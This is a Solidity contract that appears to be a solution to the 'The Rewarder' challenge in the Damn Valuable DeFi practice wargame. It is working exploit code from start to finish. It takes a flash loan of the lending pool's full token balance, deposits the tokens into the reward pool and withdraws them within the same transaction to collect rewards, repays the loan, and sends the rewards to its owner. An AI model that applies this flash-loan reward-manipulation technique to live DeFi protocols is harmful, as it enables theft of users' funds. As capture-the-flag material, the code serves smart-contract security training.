// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract ExploitRewarderPool {

    address public owner;
    FlashLoanerPool public flashLoanPool;
    DamnValuableToken public dvToken;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;

    constructor(
        address _flashLoanPool, 
        address _dvToken,
        address _rewarderPool,
        address _rewardToken
    ) {
        owner = msg.sender;
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        dvToken = DamnValuableToken(_dvToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
    }

    modifier onlyOwner {
        require(msg.sender == owner, 'non-owner call');
        _;
    }

    modifier onlyFlashPool {
        require(msg.sender == address(flashLoanPool), 'non-pool call');
        _;
    }

    function exploit() public onlyOwner {
        flashLoanPool.flashLoan(dvToken.balanceOf(address(flashLoanPool)));
    }

    function receiveFlashLoan(uint256 amount) public onlyFlashPool {
        // this is where the magic happens
        dvToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        uint256 rewardTokenBalance = rewardToken.balanceOf(address(this));

        require(rewardTokenBalance > 0, 'Reward tokens receive error');

        // repay flash loan
        dvToken.transfer(msg.sender, amount);

        // transfer reward tokens to owner
        rewardToken.transfer(owner, rewardTokenBalance);
    }

}